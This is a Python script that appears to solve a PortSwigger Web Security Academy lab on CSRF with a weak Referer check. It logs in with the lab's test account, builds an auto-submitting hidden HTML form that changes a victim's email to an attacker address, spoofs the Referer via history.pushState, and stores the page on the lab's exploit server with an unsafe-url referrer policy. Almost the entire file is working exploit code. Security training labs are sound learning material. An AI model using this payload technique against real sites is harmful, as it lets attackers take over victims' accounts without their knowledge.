from bs4 import BeautifulSoup
import requests

site = 'ac3e1f0c1ec979bd806c1c29009d0070.web-security-academy.net'

login_url = f'https://{site}/login'
logindata = {
    'username' : 'wiener',
    'password' : 'peter'
}
resp = requests.post(login_url, data=logindata)
print(f'HTTP status code: {resp.status_code} with response text {resp.text}')

resp = requests.post(login_url, data=logindata, headers={'referer' : login_url})


# Exploit
s = requests.Session()
url = f'https://{site}/login'
resp = s.get(url)
soup = BeautifulSoup(resp.text,'html.parser')
exploit_url = soup.find('a', {'id':'exploit-link'}).get('href')

referer_url = f'https://{site}/my-account'
exploit_html = f'''<html>
  <body>
  <form action="https://{site}/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="pwned@evil-user.net" />
  </form>
  <script>
    history.pushState("", "", "/?{referer_url}")
    document.forms[0].submit();
  </script>
  </body>
</html>'''

formData = {
    'urlIsHttps': 'on',
    'responseFile': '/exploit',
    'responseHead': 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8\nReferrer-Policy: unsafe-url',
    'responseBody': exploit_html,
    'formAction': 'STORE'
}
resp = s.post(exploit_url, data=formData)